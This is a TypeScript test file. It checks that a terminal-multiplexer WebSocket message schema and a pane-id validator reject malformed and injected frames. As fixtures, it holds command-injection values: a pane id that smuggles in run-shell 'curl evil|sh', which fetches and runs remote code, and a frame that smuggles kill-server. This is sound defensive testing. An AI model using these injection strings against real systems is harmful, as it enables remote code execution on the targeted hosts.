import { describe, expect, test } from 'bun:test';
import { MuxClientMessageSchema } from '../../../shared/types';
import { assertPaneId } from '../../src/services/herdr-control';

// Regression for #231: the /ws/mux dispatch must validate every frame before
// any field reaches a backend command. paneId is mapped into herdr pane ids
// and interpolated into RPC params, so every frame is validated up front and
// assertPaneId remains the sink-level backstop.

describe('MuxClientMessageSchema', () => {
  test('accepts valid control + subscription frames', () => {
    const valid = [
      { type: 'subscribe', sessionId: 's1' },
      { type: 'unsubscribe', sessionId: 's1' },
      { type: 'subscribe-conversation', sessionId: 's1' },
      { type: 'input', sessionId: 's1', paneId: '%0', data: 'aGk=' },
      { type: 'resize', sessionId: 's1', cols: 80, rows: 24 },
      { type: 'split', sessionId: 's1', paneId: '%1', direction: 'h' },
      { type: 'close-pane', sessionId: 's1', paneId: '%2' },
      { type: 'resize-pane', sessionId: 's1', paneId: '%0', cols: 100, rows: 40 },
      { type: 'select-pane', sessionId: 's1', paneId: '%3' },
      { type: 'adjust-pane', sessionId: 's1', paneId: '%0', direction: 'L', amount: 5 },
      { type: 'equalize-panes', sessionId: 's1', direction: 'horizontal' },
      { type: 'zoom-pane', sessionId: 's1', paneId: '%0' },
      { type: 'respawn-pane', sessionId: 's1', paneId: '%0' },
      { type: 'request-viewport', sessionId: 's1', paneId: '%0', offset: 0 },
      { type: 'ping', sessionId: '', timestamp: 123 },
      { type: 'client-info', sessionId: 's1', deviceType: 'tablet' },
    ];
    for (const frame of valid) {
      expect(MuxClientMessageSchema.safeParse(frame).success).toBe(true);
    }
  });

  test('rejects paneId carrying a command-injection newline', () => {
    const evil = { type: 'select-pane', sessionId: 's1', paneId: "%0\nrun-shell 'curl evil|sh'" };
    expect(MuxClientMessageSchema.safeParse(evil).success).toBe(false);
  });

  test('rejects non-pattern paneId', () => {
    for (const paneId of ['0', 'pane0', '%', '%0; ls', '%0 ', '']) {
      const r = MuxClientMessageSchema.safeParse({ type: 'select-pane', sessionId: 's1', paneId });
      expect(r.success).toBe(false);
    }
  });

  test('rejects string cols/rows (JSON.parse does not enforce the number type)', () => {
    const evil = { type: 'resize', sessionId: 's1', cols: '1\nkill-server', rows: 24 };
    expect(MuxClientMessageSchema.safeParse(evil).success).toBe(false);
  });

  test('rejects out-of-range and non-integer dimensions', () => {
    expect(MuxClientMessageSchema.safeParse({ type: 'resize', sessionId: 's1', cols: 0, rows: 24 }).success).toBe(false);
    expect(MuxClientMessageSchema.safeParse({ type: 'resize', sessionId: 's1', cols: 80, rows: 24.5 }).success).toBe(false);
    expect(MuxClientMessageSchema.safeParse({ type: 'resize', sessionId: 's1', cols: 999999, rows: 24 }).success).toBe(false);
  });

  test('rejects unknown bad direction', () => {
    expect(MuxClientMessageSchema.safeParse({ type: 'adjust-pane', sessionId: 's1', paneId: '%0', direction: 'X', amount: 1 }).success).toBe(false);
    expect(MuxClientMessageSchema.safeParse({ type: 'split', sessionId: 's1', paneId: '%0', direction: 'z' }).success).toBe(false);
  });

  test('rejects unknown message type', () => {
    expect(MuxClientMessageSchema.safeParse({ type: 'kill-server', sessionId: 's1' }).success).toBe(false);
  });

  test('strips unknown extra keys (forward-compatible clients)', () => {
    const r = MuxClientMessageSchema.safeParse({ type: 'select-pane', sessionId: 's1', paneId: '%0', futureField: 1 });
    expect(r.success).toBe(true);
    if (r.success) expect('futureField' in r.data).toBe(false);
  });
});

describe('assertPaneId (sink-level backstop)', () => {
  test('accepts %<digits>', () => {
    expect(() => assertPaneId('%0')).not.toThrow();
    expect(() => assertPaneId('%42')).not.toThrow();
  });

  test('throws on injection / malformed pane ids', () => {
    for (const bad of ["%0\nkill-server", '%0; ls', 'pane', '%', '', '%0 ']) {
      expect(() => assertPaneId(bad)).toThrow();
    }
  });
});
